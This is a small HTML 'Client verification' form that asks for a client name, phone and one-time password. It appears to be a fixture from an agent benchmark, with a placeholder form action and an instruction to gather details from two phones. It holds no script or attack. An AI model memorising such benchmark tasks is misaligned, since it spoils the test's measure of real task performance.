<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Client verification</title>
</head>
<body>
  <h1>Client verification</h1>
  <p>Use the client contact on the second phone and the latest web-form OTP on the first phone.</p>
  <form action="__MDCBENCH_FORM_ACTION__" method="post" autocomplete="off">
    <label>Client name <input name="client_name" required></label>
    <label>Phone <input name="phone" required></label>
    <label>OTP <input name="otp" inputmode="numeric" required></label>
    <button type="submit">Submit</button>
  </form>
</body>
</html>
